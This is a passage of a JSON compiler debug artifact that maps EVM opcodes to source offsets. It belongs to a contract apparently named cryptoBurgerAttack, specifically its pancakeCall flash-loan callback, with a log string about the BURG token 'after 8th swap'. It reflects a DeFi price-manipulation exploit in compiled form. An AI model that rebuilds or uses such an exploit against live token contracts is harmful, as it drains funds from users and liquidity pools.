      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6736,
        6843
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4898": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6736,
        6843
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4899": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6929
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 40,
      "value": "0x0"
    },
    "4901": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6929
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4902": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4904": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4905": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "4910": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "4912": {
      "op": "SHL"
    },
    "4913": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4914": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4915": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6948,
        6952
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "4916": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4918": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4919": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "ADD",
      "path": "0"
    },
    "4920": {
      "op": "MSTORE"
    },
    "4921": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6721,
        6843
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4922": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6721,
        6843
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "4923": {
      "op": "POP"
    },
    "4924": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4926": {
      "op": "DUP1"
    },
    "4927": {
      "op": "MLOAD"
    },
    "4928": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4930": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "4933": {
      "op": "DUP4"
    },
    "4934": {
      "op": "CODECOPY"
    },
    "4935": {
      "op": "DUP2"
    },
    "4936": {
      "op": "MLOAD"
    },
    "4937": {
      "op": "SWAP2"
    },
    "4938": {
      "op": "MSTORE"
    },
    "4939": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4940": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4942": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4944": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4946": {
      "op": "SHL"
    },
    "4947": {
      "op": "SUB"
    },
    "4948": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6929
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4949": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6929
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4950": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6929
      ],
      "op": "AND",
      "path": "0"
    },
    "4951": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6929
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4952": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6939
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "4957": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6939
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4958": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4960": {
      "op": "ADD"
    },
    "4961": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4963": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4965": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4966": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4967": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4968": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "SUB",
      "path": "0"
    },
    "4969": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4970": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4971": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "GAS",
      "path": "0"
    },
    "4972": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "4973": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4974": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4975": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4976": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x137D"
    },
    "4979": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4980": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4981": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4983": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4984": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4985": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4986": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4988": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4989": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4990": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "POP",
      "path": "0"
    },
    "4991": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "POP",
      "path": "0"
    },
    "4992": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "POP",
      "path": "0"
    },
    "4993": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "POP",
      "path": "0"
    },
    "4994": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4996": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4997": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4998": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "5000": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "NOT",
      "path": "0"
    },
    "5001": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "5003": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5004": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "ADD",
      "path": "0"
    },
    "5005": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "AND",
      "path": "0"
    },
    "5006": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5007": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "ADD",
      "path": "0"
    },
    "5008": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5009": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5011": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5012": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "POP",
      "path": "0"
    },
    "5013": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5014": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "ADD",
      "path": "0"
    },
    "5015": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5016": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13A1"
    },
    "5019": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5020": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5021": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "5024": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6915,
        6954
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5025": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6915,
        6954
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5026": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5028": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5029": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13AE"
    },
    "5032": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5033": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5034": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "5037": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6858,
        6964
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5038": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5039": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5041": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5042": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5043": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5044": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "SUB",
      "path": "0"
    },
    "5045": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5046": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6858,
        6964
      ],
      "op": "LOG1",
      "path": "0"
    },
    "5047": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5049": {
      "op": "DUP1"
    },
    "5050": {
      "op": "MLOAD"
    },
    "5051": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5053": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "5056": {
      "op": "DUP4"
    },
    "5057": {
      "op": "CODECOPY"
    },
    "5058": {
      "op": "DUP2"
    },
    "5059": {
      "op": "MLOAD"
    },
    "5060": {
      "op": "SWAP2"
    },
    "5061": {
      "op": "MSTORE"
    },
    "5062": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7084
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 41
    },
    "5063": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7085,
        7086
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5065": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5066": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5067": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5068": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "LT",
      "path": "0"
    },
    "5069": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13D8"
    },
    "5072": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5073": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13D8"
    },
    "5076": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "5079": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7072,
        7087
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5080": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5081": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "5083": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "MUL",
      "path": "0"
    },
    "5084": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "5086": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "ADD",
      "path": "0"
    },
    "5087": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "ADD",
      "path": "0"
    },
    "5088": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7072,
        7087
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5089": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5091": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5092": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x143B"
    },
    "5095": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5096": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5097": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "5099": {
      "op": "DUP1"
    },
    "5100": {
      "op": "DUP3"
    },
    "5101": {
      "op": "MSTORE"
    },
    "5102": {
      "op": "PUSH1",
      "value": "0x3C"
    },
    "5104": {
      "op": "SWAP1"
    },
    "5105": {
      "op": "DUP3"
    },
    "5106": {
      "op": "ADD"
    },
    "5107": {
      "op": "MSTORE"
    },
    "5108": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5110": {
      "op": "DUP1"
    },
    "5111": {
      "op": "MLOAD"
    },
    "5112": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5114": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "5117": {
      "op": "DUP4"
    },
    "5118": {
      "op": "CODECOPY"
    },
    "5119": {
      "op": "DUP2"
    },
    "5120": {
      "op": "MLOAD"
    },
    "5121": {
      "op": "SWAP2"
    },
    "5122": {
      "op": "MSTORE"
    },
    "5123": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "5125": {
      "op": "DUP3"
    },
    "5126": {
      "op": "ADD"
    },
    "5127": {
      "op": "MSTORE"
    },
    "5128": {
      "op": "PUSH32",
      "value": "0x204255524720746F6B656E2061667465722038746820737761703A2000000000"
    },
    "5161": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "5163": {
      "op": "DUP3"
    },
    "5164": {
      "op": "ADD"
    },
    "5165": {
      "op": "MSTORE"
    },
    "5166": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5168": {
      "op": "DUP2"
    },
    "5169": {
      "op": "ADD"
    },
    "5170": {
      "op": "SWAP2"
    },
    "5171": {
      "op": "SWAP1"
    },
    "5172": {
      "op": "SWAP2"
    },
    "5173": {
      "op": "MSTORE"
    },
    "5174": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "5176": {
      "op": "ADD"
    },
    "5177": {
      "op": "SWAP1"
    },
    "5178": {
      "op": "JUMP"
    },
    "5179": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5180": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5182": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5183": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5184": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5185": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "SUB",
      "path": "0"
    },
    "5186": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5187": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6979,
        7097
      ],
      "op": "LOG1",
      "path": "0"
    },
    "5188": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7107,
        7171
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 42,
      "value": "0x1477"
    },
    "5191": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5193": {
      "op": "DUP1"
    },
    "5194": {
      "op": "MLOAD"
    },
    "5195": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5197": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "5200": {
      "op": "DUP4"
    },
    "5201": {
      "op": "CODECOPY"
    },
    "5202": {
      "op": "DUP2"
    },
    "5203": {
      "op": "MLOAD"
    },
    "5204": {
      "op": "SWAP2"
    },
    "5205": {
      "op": "MSTORE"
    },
    "5206": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5208": {
      "op": "DUP1"
    },
    "5209": {
      "op": "MLOAD"
    },
    "5210": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5212": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "5215": {
      "op": "DUP4"
    },
    "5216": {
      "op": "CODECOPY"
    },
    "5217": {
      "op": "DUP2"
    },
    "5218": {
      "op": "MLOAD"
    },
    "5219": {
      "op": "SWAP2"
    },
    "5220": {
      "op": "MSTORE"
    },
    "5221": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7140
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5222": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7141,
        7142
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5224": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7143
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5225": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7143
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5226": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7143
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5227": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7143
      ],
      "op": "LT",
      "path": "0"
    },
    "5228": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7143
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5231": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7143
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5232": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7143
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5235": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7128,
        7143
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "5238": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7128,
        7143
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5239": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7107,
        7171
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5240": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 43,
      "value": "0x40"
    },
    "5242": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5243": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "5248": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "5250": {
      "op": "SHL"
    },
    "5251": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5252": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5253": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5255": {
      "op": "DUP1"
    },
    "5256": {
      "op": "MLOAD"
    },
    "5257": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5259": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "5262": {
      "op": "DUP4"
    },
    "5263": {
      "op": "CODECOPY"
    },
    "5264": {
      "op": "DUP2"
    },
    "5265": {
      "op": "MLOAD"
    },
    "5266": {
      "op": "SWAP2"
    },
    "5267": {
      "op": "MSTORE"
    },
    "5268": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5269": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7246
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "5274": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7246
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5275": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14AA"
    },
    "5278": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5279": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7260,
        7275
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5280": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7260,
        7275
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5281": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7289,
        7293
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5282": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7289,
        7293
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5283": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "5285": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "ADD",
      "path": "0"
    },
    "5286": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "5289": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7196,
        7303
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5290": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5291": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5293": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5295": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5296": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5297": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5298": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "SUB",
      "path": "0"
    },
    "5299": {
